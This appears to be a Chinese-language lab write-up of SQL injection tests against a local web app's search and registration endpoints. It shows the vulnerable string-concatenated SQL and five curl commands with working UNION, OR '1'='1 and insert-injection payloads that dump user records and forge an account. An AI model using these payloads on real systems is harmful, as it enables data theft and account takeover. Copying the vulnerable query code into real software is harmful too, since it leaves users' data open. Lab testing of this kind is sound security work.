# 步骤 5 — SQL 注入漏洞测试

> **测试日期:** 2026-07-08  
> **漏洞位置:** 搜索功能 `/search?keyword=` + 注册功能 `/register`

---

## 漏洞根源

搜索和注册功能均使用 f-string 直接拼接用户输入到 SQL 语句中，未做任何过滤或转义。

```python
# 搜索
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"

# 注册
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
```

---

## 测试 1：探测列数

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,2,3,4,5--" -b cookies.txt
```

确认 `users` 表共 **5 列**（id, username, password, email, phone）。

---

## 测试 2：UNION 注入（插入虚假数据）

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27p%27,%27inj%40x.com%27,%27138%27--" -b cookies.txt
```

**生成 SQL：**

```sql
SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,'inj','p','inj@x.com','138'--%' OR ...
```

**结果：** 搜索结果中出现伪造用户 `inj`，与真实数据混在一起显示。

---

## 测试 3：OR 万能注入（泄露全表）

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" -b cookies.txt
```

实际执行：`WHERE username LIKE '%'` 恒为真，返回全部用户。

**结果：** 共泄露 **7 个用户**（admin, alice, testuser, testuser2, newuser, zhangsan, hacker）。

---

## 测试 4：注册功能 SQL 注入

```bash
curl http://127.0.0.1:5000/register -X POST -d \
  "username=hacker', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

**结果：** 成功创建 `hacker` / `pass` 账户并可通过正常登录页登录。

---

## 测试 5：提取全部用户数据

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%20id,username,password,email,phone%20FROM%20users--" -b cookies.txt
```

**结果：** 提取到数据库中全部用户的 ID 和用户名。

---

## 总结

| 测试 | Payload | 结果 |
|------|---------|------|
| 探测列数 | `' UNION SELECT 1,2,3,4,5--` | ✅ 5列 |
| UNION 注入 | `' UNION SELECT 1,'inj','p','inj@x.com','138'--` | ✅ 插入虚假数据 |
| OR 万能注入 | `' OR '1'='1` | ✅ 返回全部用户 |
| 注册注入 | 注册时拼接 SQL 语句 | ✅ 写入任意账户 |
| 数据提取 | `' UNION SELECT ... FROM users--` | ✅ 获取全部数据 |
